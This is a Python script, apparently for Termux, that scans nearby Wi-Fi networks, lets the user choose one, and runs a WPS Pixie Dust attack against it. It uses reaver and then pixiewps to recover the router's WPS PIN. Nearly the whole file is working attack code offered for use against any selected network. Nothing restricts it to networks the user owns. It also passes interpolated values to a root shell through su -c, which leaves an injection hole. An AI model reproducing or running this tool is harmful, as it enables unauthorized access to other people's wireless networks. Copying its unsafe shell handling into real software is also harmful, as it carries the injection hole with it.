import subprocess
import re
import os

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y muestra la salida"""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode(), stderr.decode()
    else:
        print(stderr.decode())
        return stdout.decode(), stderr.decode()

def extract_value(output, key):
    """Extrae un valor de la salida del comando basado en una clave"""
    match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
    return match.group(1) if match else None

def check_tool_availability(tool):
    """Verifica si una herramienta está disponible en el sistema"""
    result, _ = run_command(f"which {tool}")
    if result.strip() == "":
        print(f"Error: {tool} no está instalado o no está en el PATH.")
        return False
    return True

def scan_wifi():
    """Escanear redes Wi-Fi cercanas"""
    print("Escaneando redes Wi-Fi...")
    resultado, _ = run_command("iw dev wlan0 scan", use_sudo=True)
    redes = []
    bssids = []
    canales = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':')[1].strip()
            redes.append(essid)
        if "BSS" in linea:
            bssid = linea.split()[1]
            bssid = bssid.split('(')[0]  # Limpiar el BSSID
            bssids.append(bssid)
        if "freq" in linea:
            try:
                freq = int(linea.split()[1])
                channel = int((freq - 2407) / 5)
                canales.append(channel)
            except ValueError:
                continue
    return redes, bssids, canales

def perform_pixie_dust_attack(bssid):
    """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
    print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
    reaver_path = "/data/data/com.termux/files/home/reaver-wps-fork-t6x/src/reaver"
    print(f"Ejecutando reaver: {reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust")
    stdout, stderr = run_command(f"{reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)

    print("Salida de reaver:")
    print(stdout)
    print(stderr)

    if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
        print("Información obtenida para Pixie Dust:")
        print(stdout)
        print("\nEjecutando pixiewps...\n")

        # Extraer los parámetros necesarios
        pke = extract_value(stdout, "PKE:")
        pkr = extract_value(stdout, "PKR:")
        ehash1 = extract_value(stdout, "E-Hash1:")
        ehash2 = extract_value(stdout, "E-Hash2:")
        authkey = extract_value(stdout, "AuthKey:")

        # Ejecutar pixiewps con los valores extraídos
        pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
        print(f"Ejecutando pixiewps: {pixiewps_command}")
        pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)

        print("Salida de pixiewps:")
        print(pixie_stdout)
        print(pixie_stderr)

        if "WPS pin:" in pixie_stdout:
            pin = extract_value(pixie_stdout, "WPS pin:")
            print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
            return pin
        else:
            print("\nPixie Dust no pudo encontrar el PIN.")
            print(pixie_stdout)
            return None
    else:
        print("\nNo se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        print(stderr)
        return None

def main():
    # Verificar la disponibilidad de las herramientas necesarias
    tools = ["iw", "pixiewps"]
    for tool in tools:
        if not check_tool_availability(tool):
            return

    # Escanear redes Wi-Fi
    redes, bssids, canales = scan_wifi()
    if redes:
        print("Redes disponibles:")
        for i, red in enumerate(redes):
            print(f"{i + 1}. {red}")
        
        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        bssid_seleccionado = bssids[seleccion]
        canal_seleccionado = canales[seleccion]
        
        # Limpiar la pantalla
        os.system('clear')
        
        print(f"Red seleccionada: {red_seleccionada}")
        print(f"BSSID: {bssid_seleccionado}")
        print(f"Canal: {canal_seleccionado}")
        
        perform_pixie_dust_attack(bssid_seleccionado)
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()






